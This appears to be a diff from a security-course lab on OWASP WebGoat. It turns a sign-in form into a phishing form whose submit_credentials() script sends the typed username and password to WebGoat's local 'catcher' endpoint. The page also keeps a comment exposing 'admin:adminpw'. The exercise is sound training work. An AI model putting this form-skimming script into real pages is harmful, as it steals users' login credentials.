@@ -1,46 +1,56 @@
-<form accept-charset="UNKNOWN" method="GET" name="form" action="#attack/1073957004/700" enctype="">
-<!-- FIXME admin:adminpw  --><!-- Use Admin to regenerate database  -->
-<h1>Sign In </h1>
-<table align="center" cellspacing="0" width="90%" border="0" cellpadding="2">
-    <tbody>
-        <tr>
-            <th colspan="2" align="left">Please sign in to your account.  See the OWASP admin if you do not have an account.</th>
-        </tr>
-        <tr>
-            <td width="30%">*Required Fields</td>
-        </tr>
-        <tr>
-            <td colspan="2">&nbsp;</td>
-        </tr>
-        <tr>
-            <td>
-                <b>*User Name : </b>
-            </td>
-            <td>
-                <input name="Username" id="ece568_2022s_user" type="TEXT" value="ece568_2022s_user">
-            </td>
-        </tr>
-        <tr>
-            <td>
-                <b>*Password : </b>
-            </td>
-            <td>
-                <input name="Password" id="ece568_2022s_pw" type="PASSWORD" value="ece568_2022s_pw">
-            </td>
-        </tr>
-        <tr>
-            <td>
-                <button id="ece568_2022s_submit" onclick="submit_credentials()"> Submit </button>
-                <!--<button name="SUBMIT" id="ece568_2022s_submit" type="SUBMIT" value="ece568_2022s_submit"> -->
-            </td>
-        </tr>
-    </tbody>
-</table>
-<script>
-    function submit_credentials() {
-         document.getElementById("ece568_2022s_user").style.backgroundColor = "green";
-      }
-</script>
+<head>
+	<script>
+		function submit_credentials() {
+			let username = document.getElementById("ece568_2022s_user").value;
+            let password = document.getElementById("ece568_2022s_pw").value;
+            let theUrl = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phishingUsername=" + username + "&phishingPassword=" + password;
+            console.log(theUrl);
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open( "POST", theUrl, false );
+            xmlHttp.send( null );
+		};
+	</script>
+</head>
+<body>
+	<form name="form" enctype="" method="post">
+		<!-- FIXME admin:adminpw  --><!-- Use Admin to regenerate database  -->
 
-</form>
+		<h1>Sign In </h1>
+		<table align="center" cellspacing="0" width="90%" border="0" cellpadding="2">
+			<tbody>
+				<tr>
+					<th colspan="2" align="left">Please sign in to your account.  See the OWASP admin if you do not have an account.</th>
+				</tr>
+				<tr>
+					<td width="30%">*Required Fields</td>
+				</tr>
+				<tr>
+					<td colspan="2">&nbsp;</td>
+				</tr>
+				<tr>
+					<td>
+						<b>*User Name : </b>
+					</td>
+					<td>
+						<input name="Username" id="ece568_2022s_user" type="TEXT" value="">
+					</td>
+				</tr>
+				<tr>
+					<td>
+						<b>*Password : </b>
+					</td>
+					<td>
+						<input name="Password" id="ece568_2022s_pw" type="PASSWORD" value="">
+					</td>
+				</tr>
+				<tr>
+					<td>
+						<input type="submit" id="ece568_2022s_submit" value="submit" onclick="submit_credentials()" >
+						<!--<button name="SUBMIT" id="ece568_2022s_submit" type="SUBMIT" value="ece568_2022s_submit"> </button>-->
+					</td>
+				</tr>
+			</tbody>
+		</table>
+	</form>
+</body>
 
